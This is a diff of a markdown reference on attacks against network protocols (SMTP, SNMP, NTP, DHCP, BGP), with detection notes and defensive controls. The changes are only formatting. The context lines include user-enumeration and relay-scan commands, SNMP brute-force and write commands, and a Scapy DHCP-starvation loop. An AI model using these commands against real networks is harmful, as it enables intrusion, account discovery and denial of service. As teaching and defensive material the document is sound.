+- FIDO2/hardware keys: `AuthorizedKeysFile` with `sk-` key types; keys cannot be exported or forwarded.
+- Disable agent forwarding on servers: `AllowAgentForwarding no` in `sshd_config`.
+- Rotate keys regularly: Audit `~/.ssh/authorized_keys` across all hosts; remove stale keys.
+- Bastion host / Jump server: Restrict direct SSH; all access routes through centrally-logged bastion.
+- Port knocking or VPN: Reduce port 22 exposure to the internet entirely.
+- Centralized key management: HashiCorp Vault SSH secrets engine, AWS Systems Manager Session Manager (no port 22 needed).
+- SSH certificate authority: Issue short-lived SSH certificates instead of long-lived authorized_keys entries.
 
 ---
 
@@ -816,7 +816,7 @@ Detection: Unusual port bindings, `ssh -D` / `-L` / `-R` flags in process comman
 
 ### How It Works
 
-**SMTP** (Simple Mail Transfer Protocol) relays email between servers. Port 25 = server-to-server; port 587 = client submission (STARTTLS); port 465 = SMTPS (implicit TLS). SMTP conversation:
+SMTP (Simple Mail Transfer Protocol) relays email between servers. Port 25 = server-to-server; port 587 = client submission (STARTTLS); port 465 = SMTPS (implicit TLS). SMTP conversation:
 
 ```
 Client: EHLO mail.sender.com
@@ -846,12 +846,12 @@ Client: QUIT
 Server: 221 Bye
 ```
 
-**IMAP** (port 993/143): Stateful protocol; email remains on server; supports folders and flags.
-**POP3** (port 995/110): Downloads and deletes from server; legacy, single-device model.
+IMAP (port 993/143): Stateful protocol; email remains on server; supports folders and flags.
+POP3 (port 995/110): Downloads and deletes from server; legacy, single-device model.
 
 ### Attack Techniques
 
-#### Open Relay Exploitation — T1566.002, T1114
+#### Open Relay Exploitation: T1566.002, T1114
 
 An open relay accepts and forwards mail from any source to any destination — used for spam and phishing.
 
@@ -872,7 +872,7 @@ QUIT
 nmap -p 25 --script smtp-open-relay mail.target.com
 ```
 
-#### SMTP User Enumeration — T1087.003
+#### SMTP User Enumeration: T1087.003
 
 ```bash
 # VRFY command
@@ -892,7 +892,7 @@ RCPT TO:<admin@target.com>
 smtp-user-enum -M RCPT -U users.txt -D target.com -t mail.target.com
 ```
 
-#### Email Spoofing and BEC — T1566.001, T1534
+#### Email Spoofing and BEC: T1566.001, T1534
 
 Without SPF, DKIM, and DMARC, any server can send email claiming to be from any domain.
 
@@ -925,14 +925,14 @@ Unsanitized `\r\n` in user-controlled fields (name, address) in SMTP headers all
 
 ### Defensive Controls
 
-- **SPF**: Publish TXT record listing authorized sending IPs; `v=spf1 include:sendgrid.net ~all`.
-- **DKIM**: Cryptographically sign outbound mail; `v=DKIM1; k=rsa; p=<pubkey>`.
-- **DMARC**: Policy for SPF/DKIM failures; `v=DMARC1; p=reject; rua=mailto:dmarc@corp.com` — enforce `p=reject`.
-- **Disable VRFY/EXPN**: `smtpd_disable_vrfy_command = yes` (Postfix); prevents user enumeration.
-- **Require authentication**: `smtpd_relay_restrictions = permit_sasl_authenticated, reject` — no open relay.
-- **STARTTLS / SMTPS**: Encrypt in transit; use TLS 1.2+ only.
-- **Anti-spoofing in email gateway**: Block external mail claiming to be from internal domain.
-- **MFA on email accounts**: Priority target for credential stuffing (O365, G Suite).
+- SPF: Publish TXT record listing authorized sending IPs; `v=spf1 include:sendgrid.net ~all`.
+- DKIM: Cryptographically sign outbound mail; `v=DKIM1; k=rsa; p=<pubkey>`.
+- DMARC: Policy for SPF/DKIM failures; `v=DMARC1; p=reject; rua=mailto:dmarc@corp.com` — enforce `p=reject`.
+- Disable VRFY/EXPN: `smtpd_disable_vrfy_command = yes` (Postfix); prevents user enumeration.
+- Require authentication: `smtpd_relay_restrictions = permit_sasl_authenticated, reject`: no open relay.
+- STARTTLS / SMTPS: Encrypt in transit; use TLS 1.2+ only.
+- Anti-spoofing in email gateway: Block external mail claiming to be from internal domain.
+- MFA on email accounts: Priority target for credential stuffing (O365, G Suite).
 
 ---
 
@@ -942,20 +942,20 @@ Unsanitized `\r\n` in user-controlled fields (name, address) in SMTP headers all
 
 SNMP (Simple Network Management Protocol) allows monitoring and configuration of network devices. Components:
 
-- **Manager**: NMS (Network Management Station) polls devices.
-- **Agent**: Runs on device; responds to queries.
-- **MIB** (Management Information Base): Tree-structured data model; OIDs identify each metric.
-- **Traps**: Unsolicited alerts from agent to manager (port 162).
+- Manager: NMS (Network Management Station) polls devices.
+- Agent: Runs on device; responds to queries.
+- MIB (Management Information Base): Tree-structured data model; OIDs identify each metric.
+- Traps: Unsolicited alerts from agent to manager (port 162).
 
 Protocol versions:
-- **SNMPv1/v2c**: Community string authentication (cleartext); no encryption.
-- **SNMPv3**: Username/password authentication (HMAC-MD5/SHA); AES encryption.
+- SNMPv1/v2c: Community string authentication (cleartext); no encryption.
+- SNMPv3: Username/password authentication (HMAC-MD5/SHA); AES encryption.
 
 Default community strings: `public` (read), `private` (write).
 
 ### Attack Techniques
 
-#### Community String Brute Force — T1110.001
+#### Community String Brute Force: T1110.001
 
 ```bash
 # Scan for SNMP
@@ -972,7 +972,7 @@ set RHOSTS 10.0.0.0/24
 run
 ```
 
-#### MIB Walk — T1082, T1016
+#### MIB Walk: T1082, T1016
 
 Once a valid community string is found, walk the entire MIB for device configuration, network topology, and credentials.
 
@@ -992,7 +992,7 @@ snmp-check -c public -v 2c 192.168.1.100
 # Returns: users, processes, software, shares, services, network info
 ```
 
-#### Write Access Exploitation — T1565.003
+#### Write Access Exploitation: T1565.003
 
 SNMP write access (`private` community or SNMPv3 write user) allows configuration modification:
 
@@ -1018,12 +1018,12 @@ snmpset -v2c -c private 192.168.1.1 \
 
 ### Defensive Controls
 
-- **Deploy SNMPv3**: Use `authPriv` security level (both authentication and encryption); algorithms SHA-256 + AES-128 minimum.
-- **Change default community strings**: Never use `public`/`private`; use long random strings or eliminate SNMPv1/v2c entirely.
-- **Firewall port 161/162**: Block SNMP from all sources except the NMS IP; UDP only needed between device and NMS.
-- **Read-only SNMP**: Separate read-only and read-write access; most monitoring needs only read.
-- **ACL on SNMP agent**: Restrict to NMS IP address on the device itself.
-- **Inventory and audit**: Identify all SNMP-enabled devices; migrate to SNMPv3.
+- Deploy SNMPv3: Use `authPriv` security level (both authentication and encryption); algorithms SHA-256 + AES-128 minimum.
+- Change default community strings: Never use `public`/`private`; use long random strings or eliminate SNMPv1/v2c entirely.
+- Firewall port 161/162: Block SNMP from all sources except the NMS IP; UDP only needed between device and NMS.
+- Read-only SNMP: Separate read-only and read-write access; most monitoring needs only read.
+- ACL on SNMP agent: Restrict to NMS IP address on the device itself.
+- Inventory and audit: Identify all SNMP-enabled devices; migrate to SNMPv3.
 
 ---
 
@@ -1033,15 +1033,15 @@ snmpset -v2c -c private 192.168.1.1 \
 
 NTP (Network Time Protocol) synchronizes clocks across the internet using a hierarchical stratum system:
 
-- **Stratum 0**: Atomic clocks, GPS receivers (reference clocks — not directly on network).
-- **Stratum 1**: Servers directly connected to Stratum 0 (e.g., `time.nist.gov`).
-- **Stratum 2+**: Servers synchronized from the stratum above.
+- Stratum 0: Atomic clocks, GPS receivers (reference clocks: not directly on network).
+- Stratum 1: Servers directly connected to Stratum 0 (e.g., `time.nist.gov`).
+- Stratum 2+: Servers synchronized from the stratum above.
 
 NTP uses UDP port 123. The protocol uses timestamps and round-trip delay calculation to achieve sub-millisecond synchronization. NTPv4 supports cryptographic authentication.
 
 ### Attack Techniques
 
-#### NTP Amplification — CVE-2013-5211, T1498.002
+#### NTP Amplification: CVE-2013-5211, T1498.002
 
 The `monlist` command (MON_GETLIST) returns the last 600 hosts that synchronized with the server. A 234-byte request generates a ~48KB response — a 557x amplification factor.
 
@@ -1055,9 +1055,9 @@ nmap -sU -p 123 --script ntp-monlist ntp.target.com
 
 Mitigation: Upgrade to NTPd 4.2.7p26+ or disable monlist (`noquery` restriction). BCP38 prevents IP spoofing that makes amplification attacks possible.
 
-#### NTP Time Manipulation — T1565.002
+#### NTP Time Manipulation: T1565.002
 
-Kerberos authentication requires clocks within **5 minutes** of the KDC. An attacker who can manipulate time can:
+Kerberos authentication requires clocks within 5 minutes of the KDC. An attacker who can manipulate time can:
 - Replay expired Kerberos tickets.
 - Cause authentication failures (denial of service).
 - Manipulate log timestamps to obscure attack timeline.
@@ -1066,13 +1066,13 @@ Detection: Sudden large time jumps in NTP sync (>step threshold), multiple NTP s
 
 ### Defensive Controls
 
-- **Disable monlist**: Add `restrict default noquery` to `ntp.conf`; or upgrade to NTPd >= 4.2.7p26.
-- **BCP38**: ISP-level ingress filtering prevents UDP source spoofing used in amplification.
-- **NTPv4 symmetric key or autokey authentication**: Prevents rogue NTP server attacks.
-- **Multiple NTP sources**: Minimum 4 sources for fault tolerance and anomaly detection.
-- **Network Time Security (NTS)**: RFC 8915 -- TLS-authenticated NTP for public servers.
-- **Firewall NTP**: Allow only to/from trusted NTP servers; block external UDP/123 to internal hosts.
-- **Monitor time skew**: Alert on >1-minute drift from authoritative sources.
+- Disable monlist: Add `restrict default noquery` to `ntp.conf`; or upgrade to NTPd >= 4.2.7p26.
+- BCP38: ISP-level ingress filtering prevents UDP source spoofing used in amplification.
+- NTPv4 symmetric key or autokey authentication: Prevents rogue NTP server attacks.
+- Multiple NTP sources: Minimum 4 sources for fault tolerance and anomaly detection.
+- Network Time Security (NTS): RFC 8915 -- TLS-authenticated NTP for public servers.
+- Firewall NTP: Allow only to/from trusted NTP servers; block external UDP/123 to internal hosts.
+- Monitor time skew: Alert on >1-minute drift from authoritative sources.
 
 ---
 
@@ -1080,7 +1080,7 @@ Detection: Sudden large time jumps in NTP sync (>step threshold), multiple NTP s
 
 ### How It Works
 
-DHCP automates IP address assignment via the **DORA** process:
+DHCP automates IP address assignment via the DORA process:
 
 ```
 1. DISCOVER: Client broadcasts on 255.255.255.255 (no IP yet)
@@ -1101,7 +1101,7 @@ DHCP also distributes: default gateway, DNS servers, NTP servers (option 42), TF
 
 ### Attack Techniques
 
-#### DHCP Starvation — T1499.002
+#### DHCP Starvation: T1499.002
 
 Flood the DHCP server with DISCOVER packets using spoofed MAC addresses to exhaust the IP address pool, then deploy a rogue DHCP server.
 
@@ -1120,7 +1120,7 @@ for i in range(256):
     sendp(pkt, iface="eth0")
 ```
 
-#### Rogue DHCP Server — T1557, T1071.001
+#### Rogue DHCP Server: T1557, T1071.001
 
 After starvation (or without it on a network without DHCP snooping), deploy a rogue server that issues attacker-controlled gateway and DNS to all new DHCP clients — enabling MITM for all traffic.
 
@@ -1143,13 +1143,13 @@ Detection: Multiple DHCP servers answering on the same segment, unexpected gatew
 
 ### Defensive Controls
 
-- **DHCP Snooping**: Switch feature that only allows DHCP responses (OFFER/ACK) from trusted uplink ports. Blocks rogue DHCP servers on access ports. Configure on all access layer switches.
-- **Dynamic ARP Inspection (DAI)**: Uses DHCP snooping binding table to validate ARP packets; prevents ARP spoofing after rogue DHCP.
-- **IP Source Guard**: Drops traffic from IPs not in the DHCP snooping table; prevents starvation via false MACs.
-- **Port Security**: Limit MAC addresses per switch port to prevent MAC flooding used in starvation.
-- **802.1X (NAC)**: Authenticate endpoints before allowing network access; rogue devices cannot participate.
-- **DHCP rate limiting**: Limit DISCOVER packets per port per second.
-- **Monitoring**: Alert on new DHCP server responses, large volumes of DISCOVER packets, DHCP pool exhaustion.
+- DHCP Snooping: Switch feature that only allows DHCP responses (OFFER/ACK) from trusted uplink ports. Blocks rogue DHCP servers on access ports. Configure on all access layer switches.
+- Dynamic ARP Inspection (DAI): Uses DHCP snooping binding table to validate ARP packets; prevents ARP spoofing after rogue DHCP.
+- IP Source Guard: Drops traffic from IPs not in the DHCP snooping table; prevents starvation via false MACs.
+- Port Security: Limit MAC addresses per switch port to prevent MAC flooding used in starvation.
+- 802.1X (NAC): Authenticate endpoints before allowing network access; rogue devices cannot participate.
+- DHCP rate limiting: Limit DISCOVER packets per port per second.
+- Monitoring: Alert on new DHCP server responses, large volumes of DISCOVER packets, DHCP pool exhaustion.
 
 ---
 
@@ -1160,16 +1160,16 @@ Detection: Multiple DHCP servers answering on the same segment, unexpected gatew
 BGP (Border Gateway Protocol) is the internet's inter-domain routing protocol. Autonomous Systems (ASes) exchange reachability information via BGP.
 
 Key concepts:
-- **AS_PATH**: Loop prevention; routes with your own ASN in the path are rejected.
-- **eBGP**: Between different ASes; routes undergo AS_PATH prepending.
-- **iBGP**: Within the same AS; full mesh or route reflectors.
-- **Prefix advertisement**: ASes announce the IP prefixes they own (e.g., AS15169 announces 8.8.8.0/24).
-- **Best path selection**: Based on AS_PATH length, MED, LOCAL_PREF, origin type.
-- **BGP sessions**: TCP 179, MD5-authenticated in most deployments.
+- AS_PATH: Loop prevention; routes with your own ASN in the path are rejected.
+- eBGP: Between different ASes; routes undergo AS_PATH prepending.
+- iBGP: Within the same AS; full mesh or route reflectors.
+- Prefix advertisement: ASes announce the IP prefixes they own (e.g., AS15169 announces 8.8.8.0/24).
+- Best path selection: Based on AS_PATH length, MED, LOCAL_PREF, origin type.
+- BGP sessions: TCP 179, MD5-authenticated in most deployments.
 
 ### Attack Techniques
 
-#### BGP Prefix Hijacking — T1584.007, T1557
+#### BGP Prefix Hijacking: T1584.007, T1557
 
 An AS advertises prefixes it does not legitimately own — either accidentally (misconfiguration) or maliciously. Routers prefer more-specific prefixes (longer prefix length).
 
@@ -1180,15 +1180,15 @@ Result:     Traffic destined for 8.8.8.0/25 routes to AS_EVIL instead of Google
 ```
 
 High-profile incidents:
-- **2010 China Telecom**: AS4134 originated 37,000 prefixes for 18 minutes, affecting YouTube, US government, and others.
-- **2022 KlaySwap (Kakaotalk)**: BGP hijack of Kakao's DNS provider used to steal $1.9M in crypto.
+- 2010 China Telecom: AS4134 originated 37,000 prefixes for 18 minutes, affecting YouTube, US government, and others.
+- 2022 KlaySwap (Kakaotalk): BGP hijack of Kakao's DNS provider used to steal $1.9M in crypto.
 
 #### BGP Route Leaks
 
 A route leak occurs when an AS re-announces routes it should not -- typically advertising routes learned from a peer to another peer or upstream.
 
-- **2019 Cloudflare/Verizon**: DQE Communications leaked 212 routes through Allegheny Technologies to Verizon, which propagated globally, making Cloudflare briefly unreachable for millions.
-- **2010 Moratel**: Leaked Google prefixes, causing outages.
+- 2019 Cloudflare/Verizon: DQE Communications leaked 212 routes through Allegheny Technologies to Verizon, which propagated globally, making Cloudflare briefly unreachable for millions.
+- 2010 Moratel: Leaked Google prefixes, causing outages.
 
 #### Prefix Hijacking for Certificate Theft
 
@@ -1215,17 +1215,17 @@ Tools: BGPmon, RIPE BGPlay, Cloudflare Radar BGP, Team Cymru BGP routing securit
 
 ### Defensive Controls
 
-- **RPKI (Resource Public Key Infrastructure)**: Cryptographically binds IP prefixes to their authorized origin AS via Route Origin Authorizations (ROAs). BGP routers with RPKI validation (ROV) drop INVALID routes. As of 2024, ~50% of global prefixes have valid ROAs.
+- RPKI (Resource Public Key Infrastructure): Cryptographically binds IP prefixes to their authorized origin AS via Route Origin Authorizations (ROAs). BGP routers with RPKI validation (ROV) drop INVALID routes. As of 2024, ~50% of global prefixes have valid ROAs.
   ```
   ROA: AS15169 is authorized to announce 8.8.8.0/24 (max /24)
   Attacker: AS_EVIL announces 8.8.8.0/25 -> RPKI INVALID -> dropped by validating routers
   ```
-- **BGPsec**: Cryptographically signs AS_PATH; prevents path manipulation. Deployment is nascent due to performance overhead.
-- **Route filtering / RPSL**: Define strict prefix filters using IRR (Internet Routing Registry) data; only accept expected prefixes from peers.
-- **Max-prefix limits**: Shutdown BGP sessions that advertise more prefixes than expected (prevents leak propagation).
-- **MANRS (Mutually Agreed Norms for Routing Security)**: Industry initiative; four actions: filtering, anti-spoofing (BCP38), coordination, global validation.
-- **BGP MD5 session authentication**: Prevents session hijacking via TCP RST injection.
-- **ASPA (Autonomous System Provider Authorization)**: Next-generation route leak prevention; AS authorizes its upstream providers.
+- BGPsec: Cryptographically signs AS_PATH; prevents path manipulation. Deployment is nascent due to performance overhead.
+- Route filtering / RPSL: Define strict prefix filters using IRR (Internet Routing Registry) data; only accept expected prefixes from peers.
+- Max-prefix limits: Shutdown BGP sessions that advertise more prefixes than expected (prevents leak propagation).
+- MANRS (Mutually Agreed Norms for Routing Security): Industry initiative; four actions: filtering, anti-spoofing (BCP38), coordination, global validation.
+- BGP MD5 session authentication: Prevents session hijacking via TCP RST injection.
+- ASPA (Autonomous System Provider Authorization): Next-generation route leak prevention; AS authorizes its upstream providers.
 
 ---
 
@@ -1233,18 +1233,18 @@ Tools: BGPmon, RIPE BGPlay, Cloudflare Radar BGP, Team Cymru BGP routing securit
 
 | Protocol | Port(s) | Transport | Top Attacks | Key Defense | Detection Source | ATT&CK |
 |----------|---------|-----------|-------------|-------------|-----------------|--------|
-| **DNS** | 53 | UDP/TCP | Tunneling, amplification, hijacking, rebinding, subdomain takeover | RPZ, DNSSEC, DNS filtering, DoH/DoT | DNS resolver logs, Zeek dns.log | T1071.004, T1048.003, T1498.002 |
-| **HTTP/S** | 80, 443 | TCP | SSRF (IMDS), request smuggling, HTTP/2 CONTINUATION flood, Slowloris | WAF, IMDSv2, timeout limits, input validation | WAF logs, access logs, server metrics | T1190, T1090, T1498.002 |
-| **SMB** | 445 | TCP | EternalBlue (MS17-010), Pass-the-Hash, NTLM relay, brute force, share enum | Disable SMBv1, require signing, LAPS, block 445 at perimeter | Event 5140, 4624 Type 3, 4776 | T1210, T1550.002, T1557.001, T1135 |
-| **Kerberos** | 88 | TCP/UDP | Kerberoasting, AS-REP Roasting, Golden Ticket, Silver Ticket, Pass-the-Ticket | AES enforcement, gMSA, FAST armoring, krbtgt rotation | Event 4769 (RC4), 4768 (PreAuth=0), 4771 | T1558.001-.004, T1550.003 |
-| **LDAP** | 389, 636 | TCP | LDAP injection, anonymous bind enum, ldapdomaindump, LDAP relay | Require signing, disable anon bind, restrict to mgmt nets | Event 2889, Zeek ldap.log, bulk query alerts | T1087.002, T1069.002, T1557.001 |
-| **RDP** | 3389 | TCP | BlueKeep (CVE-2019-0708), DejaBlue, brute force, session hijacking, PtH | NLA required, MFA, restrict source IPs, RDP Gateway | Event 4624 Type 10, 4625, 4778, TermServ 1149 | T1210, T1563.002, T1550.002 |
-| **SSH** | 22 | TCP | Brute force, key theft, agent hijacking, port-forward tunneling | Keys only, FIDO2, disable agent forward, bastion host | auth.log, /var/log/secure, Zeek ssh.log | T1110.001, T1552.004, T1563.001, T1572 |
-| **SMTP/IMAP** | 25, 587, 465, 993, 143 | TCP | Open relay, user enumeration (VRFY), email spoofing, BEC | SPF+DKIM+DMARC (reject), disable VRFY, require auth | SMTP gateway logs, email headers, auth logs | T1566.001, T1566.002, T1534, T1087.003 |
-| **SNMP** | 161, 162 | UDP | Community string brute force, MIB walk, write-access config change | SNMPv3 authPriv, firewall to NMS only, no default strings | Firewall logs, IDS SNMP signatures, device logs | T1110.001, T1082, T1016, T1565.003 |
-| **NTP** | 123 | UDP | monlist amplification (CVE-2013-5211, 557x), time manipulation (Kerberos skew) | Disable monlist, BCP38, NTPv4 auth, multiple sources | NetFlow (large UDP/123 responses), NTP sync logs | T1498.002, T1565.002 |
-| **DHCP** | 67, 68 | UDP | Starvation (Yersinia/dhcpig), rogue DHCP server -> MITM | DHCP snooping, DAI, IP source guard, 802.1X NAC | Switch logs, DHCP server logs, ARP tables | T1499.002, T1557, T1071.001 |
-| **BGP** | 179 | TCP | Prefix hijacking (more-specific), route leaks, cert theft via BGP+ACME | RPKI/ROV, route filters, max-prefix limits, MANRS | BGPmon, RIPE RIS, looking glasses, router logs | T1584.007, T1557 |
+| DNS | 53 | UDP/TCP | Tunneling, amplification, hijacking, rebinding, subdomain takeover | RPZ, DNSSEC, DNS filtering, DoH/DoT | DNS resolver logs, Zeek dns.log | T1071.004, T1048.003, T1498.002 |
+| HTTP/S | 80, 443 | TCP | SSRF (IMDS), request smuggling, HTTP/2 CONTINUATION flood, Slowloris | WAF, IMDSv2, timeout limits, input validation | WAF logs, access logs, server metrics | T1190, T1090, T1498.002 |
+| SMB | 445 | TCP | EternalBlue (MS17-010), Pass-the-Hash, NTLM relay, brute force, share enum | Disable SMBv1, require signing, LAPS, block 445 at perimeter | Event 5140, 4624 Type 3, 4776 | T1210, T1550.002, T1557.001, T1135 |
+| Kerberos | 88 | TCP/UDP | Kerberoasting, AS-REP Roasting, Golden Ticket, Silver Ticket, Pass-the-Ticket | AES enforcement, gMSA, FAST armoring, krbtgt rotation | Event 4769 (RC4), 4768 (PreAuth=0), 4771 | T1558.001-.004, T1550.003 |
+| LDAP | 389, 636 | TCP | LDAP injection, anonymous bind enum, ldapdomaindump, LDAP relay | Require signing, disable anon bind, restrict to mgmt nets | Event 2889, Zeek ldap.log, bulk query alerts | T1087.002, T1069.002, T1557.001 |
+| RDP | 3389 | TCP | BlueKeep (CVE-2019-0708), DejaBlue, brute force, session hijacking, PtH | NLA required, MFA, restrict source IPs, RDP Gateway | Event 4624 Type 10, 4625, 4778, TermServ 1149 | T1210, T1563.002, T1550.002 |
+| SSH | 22 | TCP | Brute force, key theft, agent hijacking, port-forward tunneling | Keys only, FIDO2, disable agent forward, bastion host | auth.log, /var/log/secure, Zeek ssh.log | T1110.001, T1552.004, T1563.001, T1572 |
+| SMTP/IMAP | 25, 587, 465, 993, 143 | TCP | Open relay, user enumeration (VRFY), email spoofing, BEC | SPF+DKIM+DMARC (reject), disable VRFY, require auth | SMTP gateway logs, email headers, auth logs | T1566.001, T1566.002, T1534, T1087.003 |
+| SNMP | 161, 162 | UDP | Community string brute force, MIB walk, write-access config change | SNMPv3 authPriv, firewall to NMS only, no default strings | Firewall logs, IDS SNMP signatures, device logs | T1110.001, T1082, T1016, T1565.003 |
+| NTP | 123 | UDP | monlist amplification (CVE-2013-5211, 557x), time manipulation (Kerberos skew) | Disable monlist, BCP38, NTPv4 auth, multiple sources | NetFlow (large UDP/123 responses), NTP sync logs | T1498.002, T1565.002 |
+| DHCP | 67, 68 | UDP | Starvation (Yersinia/dhcpig), rogue DHCP server -> MITM | DHCP snooping, DAI, IP source guard, 802.1X NAC | Switch logs, DHCP server logs, ARP tables | T1499.002, T1557, T1071.001 |
+| BGP | 179 | TCP | Prefix hijacking (more-specific), route leaks, cert theft via BGP+ACME | RPKI/ROV, route filters, max-prefix limits, MANRS | BGPmon, RIPE RIS, looking glasses, router logs | T1584.007, T1557 |
 
 ---
 
